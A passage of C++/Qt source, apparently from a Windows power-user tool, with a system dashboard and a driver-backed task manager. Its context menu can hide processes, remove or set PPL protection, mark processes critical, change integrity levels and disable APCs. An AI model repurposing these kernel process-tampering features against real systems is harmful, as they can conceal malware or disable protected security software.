            QString("Available: %1").arg(FormatBytes(Memory.ullAvailPhys)),
            QString("Committed: %1 / %2").arg(FormatBytes(UsedCommit), FormatBytes(Memory.ullTotalPageFile)));
    }

    void UpdateDisk()
    {
        const QStorageInfo Storage(QCoreApplication::applicationDirPath());
        if (!Storage.isValid() || !Storage.isReady())
            return;
        const quint64 Total = static_cast<quint64>(Storage.bytesTotal());
        const quint64 Free = static_cast<quint64>(Storage.bytesAvailable());
        const quint64 Used = Total > Free ? Total - Free : 0;
        const int Usage = Total == 0 ? 0 : static_cast<int>(std::clamp(qRound((Used * 100.0) / Total), 0, 100));
        DiskDashboard->UpdateDashboard(
            Usage, QString::number(Usage) + "%", QString("Drive: %1").arg(QDir::toNativeSeparators(Storage.rootPath())),
            QString("Used: %1 / %2").arg(FormatBytes(Used), FormatBytes(Total)),
            QString("Free: %1").arg(FormatBytes(Free)));
    }

    void UpdateNetwork()
    {
        const NetworkTrafficSnapshot Current = QueryNetworkTrafficSnapshot();
        const qint64 CurrentSampleTime = QDateTime::currentMSecsSinceEpoch();
        const qint64 ElapsedMs = std::max<qint64>(1, CurrentSampleTime - PreviousSampleTime);
        const quint64 DownloadRate = Current.InBytes >= PreviousNetwork.InBytes
                                         ? static_cast<quint64>((Current.InBytes - PreviousNetwork.InBytes) * 1000ull /
                                                                static_cast<quint64>(ElapsedMs))
                                         : 0;
        const quint64 UploadRate = Current.OutBytes >= PreviousNetwork.OutBytes
                                       ? static_cast<quint64>((Current.OutBytes - PreviousNetwork.OutBytes) * 1000ull /
                                                              static_cast<quint64>(ElapsedMs))
                                       : 0;
        const quint64 PeakRate = std::max<quint64>(DownloadRate, UploadRate);
        const int Usage = PeakRate == 0 ? 0 : std::min(100, static_cast<int>(qRound(std::log2(PeakRate + 1) * 8.0)));

        PreviousNetwork = Current;
        PreviousSampleTime = CurrentSampleTime;

        NetworkDashboard->UpdateDashboard(
            Usage, QString("D %1 | U %2").arg(FormatRate(DownloadRate), FormatRate(UploadRate)),
            QString("Received: %1").arg(FormatBytes(Current.InBytes)),
            QString("Sent: %1").arg(FormatBytes(Current.OutBytes)),
            QString("Sample interval: %1 ms").arg(ElapsedMs));
    }

    QTimer *RefreshTimer = nullptr;
    PerformanceDashboardCard *CpuDashboard = nullptr;
    PerformanceDashboardCard *MemoryDashboard = nullptr;
    PerformanceDashboardCard *DiskDashboard = nullptr;
    PerformanceDashboardCard *NetworkDashboard = nullptr;
    ZhDatePicker *HeroDateEdit = nullptr;
    TimePicker *HeroTimeEdit = nullptr;
    quint64 PreviousIdle = 0;
    quint64 PreviousKernel = 0;
    quint64 PreviousUser = 0;
    NetworkTrafficSnapshot PreviousNetwork;
    qint64 PreviousSampleTime = 0;
};

QWidget *CreateInformationPage()
{
    return new InformationOverviewPage;
}

class TaskManagerPage final : public QWidget
{
    static constexpr int KProcessPinnedRole = Qt::UserRole + 1;

    class ProcessTableItem final : public QTableWidgetItem
    {
      public:
        using QTableWidgetItem::QTableWidgetItem;

        bool operator<(const QTableWidgetItem &Other) const override
        {
            const bool LeftPinned = data(KProcessPinnedRole).toBool();
            const bool RightPinned = Other.data(KProcessPinnedRole).toBool();
            if (LeftPinned != RightPinned)
            {
                const QTableWidget *Table = tableWidget();
                const Qt::SortOrder Order = Table && Table->horizontalHeader()
                                                ? Table->horizontalHeader()->sortIndicatorOrder()
                                                : Qt::AscendingOrder;
                return Order == Qt::AscendingOrder ? LeftPinned : !LeftPinned;
            }
            return QTableWidgetItem::operator<(Other);
        }
    };

    struct ProcessRow
    {
        DWORD Pid = 0;
        DWORD ParentPid = 0;
        DWORD ThreadCount = 0;
        DWORD HandleCount = 0;
        DWORD HandleCountError = ERROR_SUCCESS;
        DWORD SessionId = 0;
        DWORD IntegrityRid = 0;
        quint64 Eprocess = 0;
        QString Name;
        QString User;
        QString EprocessText;
        bool DriverData = false;
        bool HandleCountAvailable = false;
        bool Protected = false;
        bool Ppl = false;
        bool Critical = false;
        bool Hidden = false;
        UCHAR PplRaw = 0;
    };

  public:
    explicit TaskManagerPage(QWidget *Parent = nullptr)
        : QWidget(Parent)
    {
        auto *Layout = new QVBoxLayout(this);
        ConfigurePageLayout(Layout);
        auto *Toolbar = new QHBoxLayout;
        ConfigureToolbarLayout(Toolbar);
        SearchEdit = new SearchLineEdit;
        SearchEdit->setPlaceholderText("Search by name, PID, or user");
        SearchEdit->setClearButtonEnabled(true);
        SearchEdit->setMaximumWidth(380);
        StatusLabel = new BodyLabel("Ready");
        auto *RunButton = MakeButton("Run");
        RefreshButton = MakeButton("Refresh", true);
        Toolbar->addWidget(SearchEdit);
        Toolbar->addWidget(StatusLabel, 1);
        Toolbar->addWidget(RunButton);
        Toolbar->addWidget(RefreshButton);
        Layout->addLayout(Toolbar);

        ProcessTable = MakeTable({"PID", "Name", "User", "Integrity", "PPL", "EPROCESS", "Parent PID"});
        ProcessTable->setSelectionMode(QAbstractItemView::ExtendedSelection);
        ProcessTable->setContextMenuPolicy(Qt::CustomContextMenu);
        ProcessTable->setSortingEnabled(true);
        ProcessTable->setProperty("UseGenericDetailDialog", false);
        ProcessTable->setTextElideMode(Qt::ElideNone);
        ProcessTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
        ProcessTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch);
        ProcessTable->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
        for (int Column = 3; Column < ProcessTable->columnCount(); ++Column)
            ProcessTable->horizontalHeader()->setSectionResizeMode(Column, QHeaderView::ResizeToContents);
        Layout->addWidget(ProcessTable, 1);

        QObject::connect(SearchEdit, &QLineEdit::textChanged, this, [this] { PopulateTable(); });
        QObject::connect(RunButton, &QPushButton::clicked, this, [this] { ShowLaunchAsDialog(this); });
        QObject::connect(RefreshButton, &QPushButton::clicked, this, [this] {
            RefreshProcesses();
            ShowSuccessNotice(this, "Task", "Process refresh started.");
        });
        QObject::connect(ProcessTable, &QWidget::customContextMenuRequested, this,
                         [this](const QPoint &Position) { ShowProcessMenu(Position); });
        QObject::connect(ProcessTable, &QTableWidget::cellDoubleClicked, this, [this](int Row, int) {
            if (ProcessTable->item(Row, 0))
                ShowProcessInspector(ProcessTable->item(Row, 0)->data(Qt::UserRole).toUInt());
        });

        auto *RefreshTimer = new QTimer(this);
        QObject::connect(RefreshTimer, &QTimer::timeout, this, [this] {
            if (isVisible()) RefreshProcesses();
        });
        RefreshTimer->start(4000);
        RefreshProcesses();
    }

  private:
    static QString QueryProcessUser(DWORD Pid)
    {
        QString Result = "N/A";
        HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Pid);
        if (!Process)
            return Result;
        HANDLE Token = nullptr;
        if (OpenProcessToken(Process, TOKEN_QUERY, &Token))
        {
            DWORD Size = 0;
            GetTokenInformation(Token, TokenUser, nullptr, 0, &Size);
            std::vector<unsigned char> Buffer(Size);
            if (Size && GetTokenInformation(Token, TokenUser, Buffer.data(), Size, &Size))
            {
                const auto *TokenUserInformation = reinterpret_cast<TOKEN_USER *>(Buffer.data());
                wchar_t Name[256]{};
                wchar_t Domain[256]{};
                DWORD NameSize = 256;
                DWORD DomainSize = 256;
                SID_NAME_USE Use = SidTypeUnknown;
                if (LookupAccountSidW(nullptr, TokenUserInformation->User.Sid, Name, &NameSize,
                                      Domain, &DomainSize, &Use))
                    Result = QString::fromWCharArray(Domain) + "\\" + QString::fromWCharArray(Name);
            }
            CloseHandle(Token);
        }
        CloseHandle(Process);
        return Result;
    }

    static DWORD QueryIntegrityRid(DWORD Pid)
    {
        HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Pid);
        if (!Process)
            return 0;
        HANDLE Token = nullptr;
        DWORD Result = 0;
        if (OpenProcessToken(Process, TOKEN_QUERY, &Token))
        {
            Result = GetIntegrityLevel(Token);
            CloseHandle(Token);
        }
        CloseHandle(Process);
        return Result;
    }

    static bool QueryProcessHandleCount(DWORD Pid, DWORD &HandleCount, DWORD &ErrorCode)
    {
        HandleCount = 0;
        ErrorCode = ERROR_SUCCESS;

        HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Pid);
        if (!Process)
        {
            ErrorCode = GetLastError();
            return false;
        }

        const BOOL Success = GetProcessHandleCount(Process, &HandleCount);
        if (!Success)
            ErrorCode = GetLastError();

        CloseHandle(Process);
        return Success != FALSE;
    }

    static QString FormatTaskPointer(quint64 Value)
    {
        if (Value == 0)
            return "-";
        return QString("0x%1").arg(Value, sizeof(quintptr) * 2, 16, QLatin1Char('0')).toUpper();
    }

    static QString FormatProcessCpuTime(quint64 HundredNanoseconds)
    {
        return FormatDuration(HundredNanoseconds / 10000);
    }

    struct InspectorHandleRow
    {
        quint64 HandleValue = 0;
        quint64 ObjectAddress = 0;
        quint32 GrantedAccess = 0;
        quint32 Attributes = 0;
        QString TypeName;
        QString ObjectName;
    };

    static QString QueryObjectTypeName(HANDLE Handle)
    {
        using NtQueryObjectFn = NTSTATUS(NTAPI *)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
        constexpr auto KObjectTypeInformationClass = static_cast<OBJECT_INFORMATION_CLASS>(2);
        constexpr NTSTATUS KStatusInfoLengthMismatch = static_cast<NTSTATUS>(0xC0000004L);
        static const auto QueryObject = reinterpret_cast<NtQueryObjectFn>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryObject"));
        if (!QueryObject || !Handle)
            return {};

        ULONG Size = 0;
        NTSTATUS Status = QueryObject(Handle, KObjectTypeInformationClass, nullptr, 0, &Size);
        if (Status != KStatusInfoLengthMismatch || Size < sizeof(UNICODE_STRING))
            return {};

        std::vector<BYTE> Buffer(Size);
        Status = QueryObject(Handle, KObjectTypeInformationClass, Buffer.data(), Size, &Size);
        if (Status < 0)
            return {};

        const auto *Type = reinterpret_cast<const UNICODE_STRING *>(Buffer.data());
        if (!Type->Buffer || Type->Length == 0)
            return {};
        return QString::fromWCharArray(Type->Buffer, Type->Length / sizeof(WCHAR));
    }

    static QString QueryObjectName(HANDLE Handle)
    {
        using NtQueryObjectFn = NTSTATUS(NTAPI *)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
        constexpr auto KObjectNameInformationClass = static_cast<OBJECT_INFORMATION_CLASS>(1);
        constexpr NTSTATUS KStatusInfoLengthMismatch = static_cast<NTSTATUS>(0xC0000004L);
        static const auto QueryObject = reinterpret_cast<NtQueryObjectFn>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryObject"));
        if (!QueryObject || !Handle)
            return {};

        ULONG Size = 0;
        NTSTATUS Status = QueryObject(Handle, KObjectNameInformationClass, nullptr, 0, &Size);
        if (Status != KStatusInfoLengthMismatch || Size < sizeof(UNICODE_STRING))
            return {};

        std::vector<BYTE> Buffer(Size);
        Status = QueryObject(Handle, KObjectNameInformationClass, Buffer.data(), Size, &Size);
        if (Status < 0)
            return {};

        const auto *Name = reinterpret_cast<const UNICODE_STRING *>(Buffer.data());
        if (!Name->Buffer || Name->Length == 0)
            return {};
        return QString::fromWCharArray(Name->Buffer, Name->Length / sizeof(WCHAR));
    }

    static bool QueryUserModeHandles(DWORD Pid, std::vector<InspectorHandleRow> &Rows, DWORD &ErrorCode)
    {
        using NtQuerySystemInformationFn = NTSTATUS(NTAPI *)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
        constexpr auto KSystemExtendedHandleInformationClass = static_cast<SYSTEM_INFORMATION_CLASS>(64);
        constexpr NTSTATUS KStatusInfoLengthMismatch = static_cast<NTSTATUS>(0xC0000004L);
        static const auto QuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
        if (!QuerySystemInformation)
        {
            ErrorCode = ERROR_PROC_NOT_FOUND;
            return false;
        }

        struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX_LOCAL
        {
            PVOID Object;
            ULONG_PTR UniqueProcessId;
            ULONG_PTR HandleValue;
            ULONG GrantedAccess;
            USHORT CreatorBackTraceIndex;
            USHORT ObjectTypeIndex;
            ULONG HandleAttributes;
            ULONG Reserved;
        };

        struct SYSTEM_HANDLE_INFORMATION_EX_LOCAL
        {
            ULONG_PTR NumberOfHandles;
            ULONG_PTR Reserved;
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX_LOCAL Handles[1];
        };

        ULONG Size = 1 << 20;
        std::vector<BYTE> Buffer(Size);
        NTSTATUS Status = KStatusInfoLengthMismatch;
        ULONG ReturnLength = 0;
        while (Status == KStatusInfoLengthMismatch)
        {
            Status = QuerySystemInformation(KSystemExtendedHandleInformationClass, Buffer.data(), Size, &ReturnLength);
            if (Status == KStatusInfoLengthMismatch)
            {
                Size = std::max(Size * 2, ReturnLength + 0x1000u);
                Buffer.resize(Size);
            }
        }
        if (Status < 0)
        {
            ErrorCode = RtlNtStatusToDosError(Status);
            return false;
        }

        HANDLE Process = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Pid);
        ErrorCode = Process ? ERROR_SUCCESS : GetLastError();

        const auto *Handles = reinterpret_cast<const SYSTEM_HANDLE_INFORMATION_EX_LOCAL *>(Buffer.data());
        Rows.clear();
        for (ULONG_PTR Index = 0; Index < Handles->NumberOfHandles; ++Index)
        {
            const auto &Entry = Handles->Handles[Index];
            if (static_cast<DWORD>(Entry.UniqueProcessId) != Pid)
                continue;

            InspectorHandleRow Row;
            Row.HandleValue = static_cast<quint64>(Entry.HandleValue);
            Row.ObjectAddress = reinterpret_cast<quint64>(Entry.Object);
            Row.GrantedAccess = Entry.GrantedAccess;
            Row.Attributes = Entry.HandleAttributes;

            if (Process)
            {
                HANDLE Duplicate = nullptr;
                if (DuplicateHandle(Process, reinterpret_cast<HANDLE>(Entry.HandleValue),
                                    GetCurrentProcess(), &Duplicate, 0, FALSE, DUPLICATE_SAME_ACCESS))
                {
                    Row.TypeName = QueryObjectTypeName(Duplicate);
                    const bool QueryName = Row.TypeName.compare("File", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Key", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Directory", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("SymbolicLink", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Section", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Event", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Mutant", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Process", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Thread", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("Desktop", Qt::CaseInsensitive) == 0 ||
                                           Row.TypeName.compare("WindowStation", Qt::CaseInsensitive) == 0;
                    if (QueryName)
                        Row.ObjectName = QueryObjectName(Duplicate);
                    CloseHandle(Duplicate);
                }
            }

            Rows.push_back(std::move(Row));
        }

        if (Process)
            CloseHandle(Process);
        return true;
    }

    QString IntegrityName(DWORD Rid) const
    {
        if (Rid >= 0x5000) return "Protected";
        if (Rid >= 0x4000) return "System";
        if (Rid >= 0x3000) return "High";
        if (Rid >= 0x2000) return "Medium";
        if (Rid >= 0x1000) return "Low";
        return Rid == 0 ? "Unknown" : "Untrusted";
    }

    static void SortProcessRows(std::vector<ProcessRow> &ProcessRows)
    {
        std::stable_sort(ProcessRows.begin(), ProcessRows.end(), [](const ProcessRow &Left,
                                                                    const ProcessRow &Right) {
            if (Left.Hidden != Right.Hidden)
                return Left.Hidden;
            return Left.Pid < Right.Pid;
        });
    }

    void RefreshProcesses()
    {
        if (Refreshing.exchange(true))
            return;
        RefreshButton->setEnabled(false);
        RefreshButton->setText("Refreshing...");
        QPointer<TaskManagerPage> Page(this);
        const QSet<DWORD> ProtectedSnapshot = ProtectedPids;
        std::thread([Page, ProtectedSnapshot] {
            std::vector<ProcessRow> Result;
            std::vector<PROCESS_ENUM_ENTRY> DriverEntries;
            const bool UsedDriver = EnumProcessEntries(DriverEntries) && !DriverEntries.empty();
            if (UsedDriver)
            {
                for (const PROCESS_ENUM_ENTRY &Entry : DriverEntries)
                {
                    ProcessRow Row;
                    Row.Pid = Entry.ProcessId;
                    Row.ParentPid = Entry.ParentPid;
                    Row.ThreadCount = Entry.ThreadCount;
                    Row.SessionId = Entry.SessionId;
                    DWORD UserModeSessionId = 0;
                    if (ProcessIdToSessionId(Row.Pid, &UserModeSessionId))
                        Row.SessionId = UserModeSessionId;
                    Row.Name = Entry.ImageName[0] ? QString::fromWCharArray(Entry.ImageName) : "Unknown";
                    Row.DriverData = true;
                    Row.Ppl = Entry.IsPplProtected != FALSE;
                    Row.PplRaw = Entry.PplRawLevel;
                    Row.Critical = Entry.IsCritical != FALSE;
                    Row.Hidden = Entry.IsHidden != FALSE;
                    Row.User = QueryProcessUser(Row.Pid);
                    Row.IntegrityRid = QueryIntegrityRid(Row.Pid);
                    HANDLE Process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Row.Pid);
                    if (Process)
                    {
                        std::vector<WCHAR> ImagePath(32768);
                        DWORD ImagePathLength = static_cast<DWORD>(ImagePath.size());
                        if (QueryFullProcessImageNameW(Process, 0, ImagePath.data(), &ImagePathLength))
                        {
                            const QString FullPath = QString::fromWCharArray(ImagePath.data(), ImagePathLength);
                            const QString FullName = QFileInfo(FullPath).fileName();
                            if (!FullName.isEmpty())
                                Row.Name = FullName;
                        }
                        CloseHandle(Process);
                    }
                    Row.HandleCountAvailable =
                        QueryProcessHandleCount(Row.Pid, Row.HandleCount, Row.HandleCountError);
                    std::vector<MDV2_RECORD> ProcessRecords;
                    MDV2_LIST_HEADER ProcessHeader{};
                    if (QueryProcessRecordsV2(Row.Pid, IOCTL_QUERY_PROCESS_V2, ProcessRecords, &ProcessHeader) &&
                        !ProcessRecords.empty())
                    {
                        Row.Eprocess = ProcessRecords.front().Address;
                        Row.EprocessText = FormatTaskPointer(Row.Eprocess);
                    }
                    Result.push_back(std::move(Row));
                }
            }
            else
            {
                HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (Snapshot != INVALID_HANDLE_VALUE)
                {
                    PROCESSENTRY32W Entry{sizeof(Entry)};
                    if (Process32FirstW(Snapshot, &Entry))
                    {
                        do
                        {
                            ProcessRow Row;
                            Row.Pid = Entry.th32ProcessID;
                            Row.ParentPid = Entry.th32ParentProcessID;
                            Row.ThreadCount = Entry.cntThreads;
                            Row.Name = QString::fromWCharArray(Entry.szExeFile);
                            ProcessIdToSessionId(Row.Pid, &Row.SessionId);
                            Row.User = QueryProcessUser(Row.Pid);
                            Row.IntegrityRid = QueryIntegrityRid(Row.Pid);
                            Row.HandleCountAvailable =
                                QueryProcessHandleCount(Row.Pid, Row.HandleCount, Row.HandleCountError);
                            Row.EprocessText = "-";
                            Result.push_back(std::move(Row));
                        } while (Process32NextW(Snapshot, &Entry));
                    }
                    CloseHandle(Snapshot);
                }
            }
            for (ProcessRow &Row : Result)
            {
                if (ProtectedSnapshot.contains(Row.Pid))
                    Row.Protected = true;
            }
            QMetaObject::invokeMethod(qApp, [Page, Result = std::move(Result), UsedDriver]() mutable {
                if (!Page)
                    return;
                for (auto Retained = Page->RetainedProcesses.begin();
                     Retained != Page->RetainedProcesses.end();)
                {
                    const DWORD Pid = Retained->first;
                    auto Match = std::find_if(Result.begin(), Result.end(), [Pid](const ProcessRow &Row) {
                        return Row.Pid == Pid;
                    });
                    if (Match != Result.end())
                    {
                        if (Retained->second.Hidden)
                        {
                            Match->Hidden = true;
                            ++Retained;
                        }
                        else
                        {
                            Retained = Page->RetainedProcesses.erase(Retained);
                        }
                        continue;
                    }

                    bool ProcessExited = false;
                    HANDLE Process = OpenProcess(SYNCHRONIZE, FALSE, Pid);
                    if (Process)
                    {
                        ProcessExited = WaitForSingleObject(Process, 0) == WAIT_OBJECT_0;
                        CloseHandle(Process);
                    }
                    if (ProcessExited)
                    {
                        Retained = Page->RetainedProcesses.erase(Retained);
                        continue;
                    }
                    Result.push_back(Retained->second);
                    ++Retained;
                }
                SortProcessRows(Result);
                Page->Rows = std::move(Result);
                Page->StatusLabel->setText(QString("%1 processes  |  %2")
                                               .arg(Page->Rows.size())
                                               .arg(UsedDriver ? "Driver enumeration" : "Toolhelp fallback"));
                Page->RefreshButton->setText("Refresh");
                Page->RefreshButton->setEnabled(true);
                Page->Refreshing = false;
                Page->PopulateTable();
            }, Qt::QueuedConnection);
        }).detach();
    }

    void PopulateTable()
    {
        const QString Query = SearchEdit->text().trimmed();
        QSet<DWORD> SelectedPids;
        for (const QModelIndex &Selected : ProcessTable->selectionModel()->selectedRows(0))
        {
            if (const QTableWidgetItem *Item = ProcessTable->item(Selected.row(), 0))
                SelectedPids.insert(Item->data(Qt::UserRole).toUInt());
        }
        ProcessTable->setUpdatesEnabled(false);
        ProcessTable->setSortingEnabled(false);
        ProcessTable->clearContents();
        ProcessTable->setRowCount(0);
        for (const ProcessRow &Process : Rows)
        {
            if (!Query.isEmpty() && !Process.Name.contains(Query, Qt::CaseInsensitive) &&
                !Process.User.contains(Query, Qt::CaseInsensitive) &&
                !Process.EprocessText.contains(Query, Qt::CaseInsensitive) &&
                !QString::number(Process.Pid).contains(Query))
                continue;
            const int Row = ProcessTable->rowCount();
            ProcessTable->insertRow(Row);
            const auto CreateItem = [&Process](const QString &Text) {
                auto *Item = new ProcessTableItem(Text);
                Item->setData(KProcessPinnedRole, Process.Hidden);
                return Item;
            };
            auto *PidItem = new ProcessTableItem;
            PidItem->setData(Qt::DisplayRole, QVariant::fromValue<qulonglong>(Process.Pid));
            PidItem->setData(Qt::UserRole, QVariant::fromValue<qulonglong>(Process.Pid));
            PidItem->setData(KProcessPinnedRole, Process.Hidden);
            ProcessTable->setItem(Row, 0, PidItem);
            ProcessTable->setItem(Row, 1, CreateItem(Process.Name));
            ProcessTable->setItem(Row, 2, CreateItem(Process.User));
            ProcessTable->setItem(Row, 3, CreateItem(IntegrityName(Process.IntegrityRid)));
            ProcessTable->setItem(Row, 4, CreateItem(Process.Ppl ?
                QString("Yes (0x%1)").arg(Process.PplRaw, 2, 16, QLatin1Char('0')) : "No"));
            ProcessTable->setItem(Row, 5, CreateItem(Process.EprocessText.isEmpty()
                ? FormatTaskPointer(Process.Eprocess) : Process.EprocessText));
            ProcessTable->setItem(Row, 6, CreateItem(QString::number(Process.ParentPid)));
            ProcessTable->setRowHeight(Row, 38);
        }
        ProcessTable->setSortingEnabled(true);
        if (!SelectedPids.isEmpty())
        {
            for (int Row = 0; Row < ProcessTable->rowCount(); ++Row)
            {
                const QTableWidgetItem *Item = ProcessTable->item(Row, 0);
                if (Item && SelectedPids.contains(Item->data(Qt::UserRole).toUInt()))
                    ProcessTable->selectionModel()->select(
                        ProcessTable->model()->index(Row, 0),
                        QItemSelectionModel::Select | QItemSelectionModel::Rows);
            }
        }
        ProcessTable->setUpdatesEnabled(true);
    }

    const ProcessRow *FindProcess(DWORD Pid) const
    {
        const auto Match = std::find_if(Rows.begin(), Rows.end(), [Pid](const ProcessRow &Row) { return Row.Pid == Pid; });
        return Match == Rows.end() ? nullptr : &*Match;
    }

    bool ConfirmDangerous(const QString &Title, const QString &Text)
    {
        return QMessageBox::warning(this, Title, Text, QMessageBox::Yes | QMessageBox::No,
                                    QMessageBox::No) == QMessageBox::Yes;
    }

    void ReportDriverResult(const QString &Action)
    {
        if (G_LastMultiDrvError != ERROR_SUCCESS)
            ShowErrorNotice(this, Action, QString("Driver operation failed (error %1).").arg(G_LastMultiDrvError));
        else
        {
            ShowSuccessNotice(this, Action, "Operation completed successfully.");
            QTimer::singleShot(250, this, [this] { RefreshProcesses(); });
        }
    }

    void AddMenuAction(RoundMenu *Menu, const QString &Text, const std::function<void()> &Handler)
    {
        auto *Action = new QAction(Text, Menu);
        Menu->addAction(Action);
        ConnectMenuAction(Action, this, Handler);
    }

    void ShowProcessMenu(const QPoint &Position)
    {
        const QModelIndex Index = ProcessTable->indexAt(Position);
        if (!Index.isValid())
            return;
        if (!ProcessTable->selectionModel()->isRowSelected(Index.row(), QModelIndex()))
        {
            ProcessTable->clearSelection();
            ProcessTable->selectRow(Index.row());
        }
        const DWORD Pid = ProcessTable->item(Index.row(), 0)->data(Qt::UserRole).toUInt();
        const ProcessRow *Process = FindProcess(Pid);
        if (!Process || Pid == 0)
            return;
        if (Pid == GetCurrentProcessId())
        {
            ShowWarningNotice(this, "Task", "Operations on WindowsToolV2 itself are disabled.");
            return;
        }
        const QString Name = Process->Name;
        std::vector<DWORD> SelectedPids;
        for (const QModelIndex &Selected : ProcessTable->selectionModel()->selectedRows(0))
        {
            const DWORD SelectedPid = ProcessTable->item(Selected.row(), 0)->data(Qt::UserRole).toUInt();
            if (SelectedPid != 0 && SelectedPid != GetCurrentProcessId())
                SelectedPids.push_back(SelectedPid);
        }
        if (SelectedPids.empty())
            return;

        auto *Menu = new RoundMenu(QString(), this);
        AddMenuAction(Menu, "Terminate", [this, SelectedPids] { ShowTerminateDialog(SelectedPids); });

        auto *PplMenu = new RoundMenu("PPL", Menu);
        AddMenuAction(PplMenu, "RemovePPL", [this, SelectedPids] { for (DWORD SelectedPid : SelectedPids) RemovePpl(SelectedPid); ReportDriverResult("RemovePPL"); });
        AddMenuAction(PplMenu, "SetPPL", [this, Pid] { ConfigurePpl(Pid); });
        Menu->addMenu(PplMenu);

        auto *ProtectMenu = new RoundMenu("Protect", Menu);
        AddMenuAction(ProtectMenu, "Protect", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) {
                ProtectProcess(SelectedPid);
                if (G_LastMultiDrvError == ERROR_SUCCESS) ProtectedPids.insert(SelectedPid);
            }
            ReportDriverResult("Protect");
        });
        AddMenuAction(ProtectMenu, "UnProtect", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) {
                UnprotectProcess(SelectedPid);
                if (G_LastMultiDrvError == ERROR_SUCCESS) ProtectedPids.remove(SelectedPid);
            }
            ReportDriverResult("UnProtect");
        });
        ProtectMenu->addSeparator();
        AddMenuAction(ProtectMenu, "InjectProtect", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) {
                AddInjectionProtectKernel(SelectedPid);
            }
            ReportDriverResult("InjectProtect");
        });
        AddMenuAction(ProtectMenu, "InjectUnprotect", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) {
                RemoveInjectionProtectKernel(SelectedPid);
            }
            ReportDriverResult("InjectUnprotect");
        });
        Menu->addMenu(ProtectMenu);

        auto *CriticalMenu = new RoundMenu("Critical", Menu);
        AddMenuAction(CriticalMenu, "SetCritical", [this, Pid, Name] {
            if (!ConfirmDangerous("SetCritical", QString("Mark %1 (PID %2) critical? Terminating it may crash Windows.").arg(Name).arg(Pid)))
                return;
            SetCritical(Pid);
            ReportDriverResult("SetCritical");
        });
        AddMenuAction(CriticalMenu, "UnsetCritical", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) RemoveCritical(SelectedPid);
            ReportDriverResult("UnsetCritical");
        });
        Menu->addMenu(CriticalMenu);

        auto *HideMenu = new RoundMenu("Hide", Menu);
        AddMenuAction(HideMenu, "Hide", [this, Pid] {
            const ProcessRow *Current = FindProcess(Pid);
            const std::optional<ProcessRow> Cached = Current ? std::optional<ProcessRow>(*Current) : std::nullopt;
            HideProcess(Pid);
            if (G_LastMultiDrvError == ERROR_SUCCESS && Cached)
            {
                ProcessRow Retained = *Cached;
                Retained.Hidden = true;
                RetainedProcesses[Pid] = Retained;
                for (ProcessRow &Row : Rows)
                {
                    if (Row.Pid == Pid)
                        Row.Hidden = true;
                }
                SortProcessRows(Rows);
                PopulateTable();
            }
            ReportDriverResult("Hide");
        });
        AddMenuAction(HideMenu, "Unhide", [this, Pid] {
            const ProcessRow *Current = FindProcess(Pid);
            const std::optional<ProcessRow> Cached = Current ? std::optional<ProcessRow>(*Current) : std::nullopt;
            UnhideProcess(Pid);
            if (G_LastMultiDrvError == ERROR_SUCCESS && Cached)
            {
                ProcessRow Retained = *Cached;
                Retained.Hidden = false;
                RetainedProcesses[Pid] = Retained;
                for (ProcessRow &Row : Rows)
                {
                    if (Row.Pid == Pid)
                        Row.Hidden = false;
                }
                SortProcessRows(Rows);
                PopulateTable();
            }
            ReportDriverResult("Unhide");
        });
        Menu->addMenu(HideMenu);

        AddMenuAction(Menu, "Set Integrity", [this, Pid] { ShowIntegrityDialog(Pid); });

        auto *ApcMenu = new RoundMenu("APC", Menu);
        AddMenuAction(ApcMenu, "DisableAPC", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) DisableApc(SelectedPid);
            ReportDriverResult("DisableAPC");
        });
        AddMenuAction(ApcMenu, "EnableAPC", [this, SelectedPids] {
            for (DWORD SelectedPid : SelectedPids) EnableApc(SelectedPid);
            ReportDriverResult("EnableAPC");
        });
        AddMenuAction(ApcMenu, "SendAPCSignal", [this, Pid] { ShowApcSignalDialog(Pid); });
        Menu->addMenu(ApcMenu);

        AddMenuAction(Menu, "Suspend", [this, SelectedPids] { int Count = 0; for (DWORD SelectedPid : SelectedPids) if (Suspend(SelectedPid)) ++Count; ShowSuccessNotice(this, "Suspend", QString("%1 of %2 process(es) suspended.").arg(Count).arg(SelectedPids.size())); });
